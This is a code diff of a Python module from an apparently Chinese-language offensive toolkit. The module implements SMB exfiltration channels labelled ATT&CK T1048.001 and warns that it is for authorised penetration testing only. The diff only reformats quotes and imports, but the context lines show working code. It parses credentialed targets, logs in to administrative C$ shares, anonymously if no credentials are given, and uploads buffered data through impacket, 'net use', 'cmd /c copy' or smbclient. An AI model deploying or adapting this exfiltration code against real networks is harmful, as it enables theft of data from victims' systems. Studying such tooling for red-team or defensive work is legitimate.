@@ -9,15 +9,15 @@ ATT&CK Technique: T1048.001 - Exfiltration Over Symmetric Encrypted Non-C2 Proto
 Warning: 仅限授权渗透测试使用！
 """
 
-from typing import Optional
 import logging
 import tempfile
 from pathlib import Path
+from typing import Optional
 
 from ..base import (
     BaseExfiltration,
-    ExfilConfig,
     ExfilChannel,
+    ExfilConfig,
     ExfilStatus,
 )
 
@@ -33,16 +33,16 @@ class SMBExfiltration(BaseExfiltration):
     Warning: 仅限授权渗透测试使用！
     """
 
-    name = 'smb_exfil'
-    description = 'SMB Exfiltration Channel'
+    name = "smb_exfil"
+    description = "SMB Exfiltration Channel"
     channel = ExfilChannel.SMB
 
     def __init__(self, config: ExfilConfig):
         super().__init__(config)
         self._conn = None
-        self._share = 'C$'
-        self._remote_path = ''
-        self._buffer = b''
+        self._share = "C$"
+        self._remote_path = ""
+        self._buffer = b""
         self._temp_file = None
 
     def connect(self) -> bool:
@@ -53,22 +53,22 @@ class SMBExfiltration(BaseExfiltration):
             # 解析目标
             # 格式: user:password@host/share/path 或 host
             target = self.config.destination
-            username = ''
-            password = ''
-            domain = ''
+            username = ""
+            password = ""
+            domain = ""
 
-            if '@' in target:
-                creds, target = target.rsplit('@', 1)
-                if ':' in creds:
-                    username, password = creds.split(':', 1)
+            if "@" in target:
+                creds, target = target.rsplit("@", 1)
+                if ":" in creds:
+                    username, password = creds.split(":", 1)
                 else:
                     username = creds
 
-            if '/' in target:
-                parts = target.split('/')
+            if "/" in target:
+                parts = target.split("/")
                 host = parts[0]
-                self._share = parts[1] if len(parts) > 1 else 'C$'
-                self._remote_path = '/'.join(parts[2:]) if len(parts) > 2 else ''
+                self._share = parts[1] if len(parts) > 1 else "C$"
+                self._remote_path = "/".join(parts[2:]) if len(parts) > 2 else ""
             else:
                 host = target
 
@@ -79,10 +79,11 @@ class SMBExfiltration(BaseExfiltration):
                 self._conn.login(username, password, domain)
             else:
                 # 匿名登录
-                self._conn.login('', '')
+                self._conn.login("", "")
 
             # 生成远程文件名
             import uuid
+
             filename = f"temp_{uuid.uuid4().hex[:8]}.dat"
             if self._remote_path:
                 self._remote_path = f"{self._remote_path}/{filename}"
@@ -154,10 +155,10 @@ class SMBExfiltration(BaseExfiltration):
                 self._temp_file = f.name
 
             # 上传到 SMB
-            with open(self._temp_file, 'rb') as f:
+            with open(self._temp_file, "rb") as f:
                 self._conn.putFile(self._share, self._remote_path, f.read)
 
-            self._buffer = b''
+            self._buffer = b""
             return True
 
         except Exception as e:
@@ -185,14 +186,14 @@ class SMBExfiltrationNative(BaseExfiltration):
     Warning: 仅限授权渗透测试使用！
     """
 
-    name = 'smb_native_exfil'
-    description = 'SMB Native Exfiltration Channel'
+    name = "smb_native_exfil"
+    description = "SMB Native Exfiltration Channel"
     channel = ExfilChannel.SMB
 
     def __init__(self, config: ExfilConfig):
         super().__init__(config)
         self._temp_dir = None
-        self._remote_path = ''
+        self._remote_path = ""
 
     def connect(self) -> bool:
         """准备 SMB 连接"""
@@ -201,19 +202,19 @@ class SMBExfiltrationNative(BaseExfiltration):
 
         # 解析目标
         target = self.config.destination
-        if not target.startswith('\\\\'):
-            target = f'\\\\{target}'
+        if not target.startswith("\\\\"):
+            target = f"\\\\{target}"
 
         self._remote_path = target
 
         # 在 Windows 上使用 net use
-        if platform.system() == 'Windows':
+        if platform.system() == "Windows":
             try:
                 # 测试连接
                 result = subprocess.run(
-                    ['net', 'use', self._remote_path],
+                    ["net", "use", self._remote_path],
                     capture_output=True,
-                    timeout=self.config.timeout
+                    timeout=self.config.timeout,
                 )
                 return result.returncode == 0
             except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
@@ -223,9 +224,9 @@ class SMBExfiltrationNative(BaseExfiltration):
         else:
             try:
                 result = subprocess.run(
-                    ['smbclient', '-L', self._remote_path, '-N'],
+                    ["smbclient", "-L", self._remote_path, "-N"],
                     capture_output=True,
-                    timeout=self.config.timeout
+                    timeout=self.config.timeout,
                 )
                 return result.returncode == 0
             except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
@@ -238,8 +239,8 @@ class SMBExfiltrationNative(BaseExfiltration):
     def send_chunk(self, data: bytes) -> bool:
         """通过系统命令发送数据"""
         import platform
-        import subprocess
         import shutil
+        import subprocess
         import uuid
 
         try:
@@ -248,7 +249,7 @@ class SMBExfiltrationNative(BaseExfiltration):
             temp_file = temp_dir / f"exfil_{uuid.uuid4().hex[:8]}.dat"
             temp_file.write_bytes(data)
 
-            if platform.system() == 'Windows':
+            if platform.system() == "Windows":
                 # 使用 shutil.copy 代替 shell=True 的 copy 命令
                 # 避免命令注入风险
                 remote_file = Path(self._remote_path) / temp_file.name
@@ -260,21 +261,22 @@ class SMBExfiltrationNative(BaseExfiltration):
                     # 降级到 cmd /c copy，但不使用 shell=True
                     # 使用列表参数避免命令注入
                     result = subprocess.run(
-                        ['cmd', '/c', 'copy', str(temp_file), str(remote_file)],
+                        ["cmd", "/c", "copy", str(temp_file), str(remote_file)],
                         capture_output=True,
                         shell=False,  # 安全: 不使用 shell=True
-                        timeout=self.config.timeout
+                        timeout=self.config.timeout,
                     )
                     success = result.returncode == 0
             else:
                 # 使用 smbclient
                 # 注意: 使用 shlex.quote 对路径进行转义以防止注入
                 import shlex
-                put_cmd = f'put {shlex.quote(str(temp_file))} {shlex.quote(temp_file.name)}'
+
+                put_cmd = f"put {shlex.quote(str(temp_file))} {shlex.quote(temp_file.name)}"
                 result = subprocess.run(
-                    ['smbclient', self._remote_path, '-N', '-c', put_cmd],
+                    ["smbclient", self._remote_path, "-N", "-c", put_cmd],
                     capture_output=True,
-                    timeout=self.config.timeout
+                    timeout=self.config.timeout,
                 )
                 success = result.returncode == 0
 
@@ -288,4 +290,4 @@ class SMBExfiltrationNative(BaseExfiltration):
             return False
 
 
-__all__ = ['SMBExfiltration', 'SMBExfiltrationNative']
+__all__ = ["SMBExfiltration", "SMBExfiltrationNative"]
